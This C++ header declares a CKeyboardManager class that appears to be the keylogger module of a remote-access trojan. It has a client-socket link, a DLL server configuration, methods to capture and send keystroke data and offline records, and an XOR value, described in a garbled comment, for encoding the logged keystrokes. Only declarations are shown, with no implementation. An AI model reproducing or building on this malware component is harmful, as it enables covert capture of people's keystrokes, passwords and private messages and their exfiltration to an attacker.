// KeyboardManager.h: interface for the CKeyboardManager class.
//
//////////////////////////////////////////////////////////////////////

#if !defined(AFX_KEYBOARDMANAGER_H__F0442063_CAAE_4BA1_B6CA_1FCB39A996AC__INCLUDED_)
#define AFX_KEYBOARDMANAGER_H__F0442063_CAAE_4BA1_B6CA_1FCB39A996AC__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

#include "../Manager.h"

#define	SIZE_IMM_BUFFER					128
#define XOR_ENCODE_VALUE				98	// ���̼�¼���ܵ�xorֵ

namespace dhl
{
class CKeyboardManager : public CManager
{
public:
    friend class CClientSocket;
    CKeyboardManager(CClientSocket* pClient, DLLSERVER_INFO* dll_info);
    virtual ~CKeyboardManager();
    virtual void OnReceive(LPBYTE lpBuffer, UINT nSize);
    static HINSTANCE g_hInstance;
    static HINSTANCE g_hInstances;

private:
    int sendOfflineRecord();
    int sendStartKeyBoard();
    int sendKeyBoardData(LPBYTE lpData, UINT nSize);

    DLLSERVER_INFO *m_DllInfo;
};
}

#endif // !defined(AFX_KEYBOARDMANAGER_H__F0442063_CAAE_4BA1_B6CA_1FCB39A996AC__INCLUDED_)
